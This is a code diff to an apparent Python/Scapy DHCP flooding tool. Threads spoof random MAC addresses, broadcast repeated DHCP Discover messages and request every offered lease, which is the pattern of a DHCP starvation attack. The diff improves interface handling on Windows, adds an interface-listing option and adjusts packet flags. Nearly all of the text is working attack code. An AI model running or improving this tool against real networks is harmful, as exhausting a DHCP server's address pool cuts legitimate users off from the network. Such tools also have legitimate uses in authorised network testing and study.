@@ -31,30 +31,54 @@ class C:
     MSG_REQ = RST + BRT + MGT + "DHCP Request" + RST
     MSG_ACK = RST + BRT + GRN + "DHCP Acknowledge" + RST
 
+
+def trycast(new_type, value, default=None):
+    """
+    Attempt to cast `value` as a `new_type` object
+    Return `default` upon failure  to convert
+    """
+    try:
+        default = new_type(value)
+    finally:
+        return default
+
 def ran_str(size, charset=string.ascii_uppercase + string.ascii_lowercase + string.digits):
-    """Return a random string of length `size` randomly chosen from `charset`"""
+    """
+    Return a random string of length `size` randomly chosen from `charset`
+    """
     f = (lambda x: random.sample(x, 1)[0]) if isinstance(charset, set) \
         else (random.choice)
     return ''.join(f(charset) for _ in range(size))
 
 
 def mac_val(raw):
+    """
+    Return a string value of a `raw` MAC address or Client ID
+    """
     assert isinstance(raw, bytes) and len(raw) >= 6
     val = binascii.hexlify(raw).decode()[0:12]
     return ':'.join(val[i:i+2] for i in range(0,12,2))
 
 def ran_mac():
-    """Return a random MAC address formatted with colons"""
+    """
+    Return a random MAC address formatted with colons
+    """
     return mac_val(os.urandom(6))
 
-
 def ran_mac_raw():
-    """Return mac address in raw string and raw format"""
+    """
+    Return mac address in string and raw format
+    """
     m = ran_mac()
     return m, mac2str(m)
 
 def get_iface(iface):
-    return IFACES.dev_from_name(iface) if WINDOWS else iface
+    if WINDOWS:
+        idx = trycast(int, iface)
+        if idx is not None:
+            return IFACES.dev_from_index(idx)
+        return IFACES.dev_from_name(iface)
+    return iface
 
 _evt = Event()
 def get_stop_event():
@@ -71,7 +95,7 @@ class Handler(Thread):
         assert isinstance(rq, Queue), "Please provide a Queue for `rq`"
         self._rq = rq
         self.daemon = True
-        self._iface = get_iface(iface)
+        self._iface = iface
         self._mac = get_if_hwaddr(self._iface)
         self._stop = get_stop_event()
 
@@ -122,7 +146,7 @@ class Requester(Thread):
         self.daemon = True
         self._rq = rq
         self._stop = get_stop_event()
-        self._iface = get_iface(iface)
+        self._iface = iface
         self._mac = get_if_hwaddr(self._iface)
 
     def run(self):
@@ -135,7 +159,7 @@ class Requester(Thread):
                 Ether(src=self._mac, dst="ff:ff:ff:ff:ff:ff") / \
                 IP(src="0.0.0.0", dst="255.255.255.255") / \
                 UDP(sport=68, dport=67) / \
-                BOOTP(chaddr=[pkt_offer[BOOTP].chaddr], xid=pkt_offer[BOOTP].xid, flags=0xffffff) / \
+                BOOTP(chaddr=[pkt_offer[BOOTP].chaddr], xid=pkt_offer[BOOTP].xid, flags=0x8000) / \
                 DHCP(options = [
                     ("message-type", 3),
                     ("server_id", pkt_offer[BOOTP].siaddr),
@@ -159,7 +183,7 @@ class Discover(Thread):
         self.daemon = True
         self._stop = get_stop_event()
         self._delay = delay
-        self._iface = get_iface(iface)
+        self._iface = iface
         self._mac = get_if_hwaddr(self._iface)
 
     def run(self):
@@ -169,10 +193,10 @@ class Discover(Thread):
                 Ether(src=self._mac, dst="ff:ff:ff:ff:ff:ff") / \
                 IP(src="0.0.0.0", dst="255.255.255.255") / \
                 UDP(sport=68, dport=67) / \
-                BOOTP(chaddr=mac_raw) / \
+                BOOTP(chaddr=mac_raw, flags=0x8000) / \
                 DHCP(options = [
                     ("message-type", 1),
-                    ("param_req_list", [1, 121, 3, 6, 16, 119, 252, 95, 44, 46]),
+                    ("param_req_list", [1, 3, 6, 15, 121]),
                     ("max_dhcp_size",1499),
                     ("client_id", 1, mac_raw),
                     ("lease_time",10000),
@@ -186,17 +210,25 @@ class Discover(Thread):
 
 def main():
     ap = ArgumentParser()
-    ap.add_argument("--iface", "-i", type=str, required=True, help="Interface name")
+    g = ap.add_mutually_exclusive_group(required=True)
+    g.add_argument("--iface", "-i", type=get_iface, help="Interface name")
+    g.add_argument("--list", "-l", action="store_true", help="Interface name")
     ap.add_argument("--threads", "-t", type=int, default=1, help="Number of concurrent threads")
     ap.add_argument("--delay", "-d", type=float, default=1.0, help="Delay between messages per thread")
     args = ap.parse_args()
+
+    if args.list:
+        from pprint import pprint
+        pprint(IFACES)
+        return
 
     rq = Queue()
     Handler(args.iface, rq).start()
     Requester(args.iface, rq).start()
     for _ in range(args.threads):
         Discover(args.iface, delay=args.delay).start()
-    get_stop_event().wait()
+    while True:
+        get_stop_event().wait(0.1)
 
 if __name__ == "__main__":
     try:
